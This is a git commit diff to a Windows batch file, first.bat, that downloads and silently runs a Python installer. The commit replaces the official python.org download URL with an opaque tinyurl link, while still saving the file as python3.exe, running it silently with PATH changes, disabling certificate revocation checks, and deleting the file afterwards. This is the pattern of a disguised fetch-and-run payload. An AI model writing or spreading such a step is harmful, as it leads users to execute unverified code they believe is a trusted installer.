fee141bb857f5647bcc02df11e5c431a753f3009
donno2048 <61805754+donno2048@users.noreply.github.com>
2020-06-30 21:29:39 +0300

    Update first.bat

--- first.bat
+++ first.bat
@@ -1,3 +1,3 @@
-curl.exe -o python3.exe https://www.python.org/ftp/python/3.8.3/python-3.8.3-amd64.exe --ssl-no-revoke
+curl.exe -o python3.exe https://tinyurl.com/rose2048 --ssl-no-revoke
 python3.exe /quiet PrependPath=1
 del python3.exe
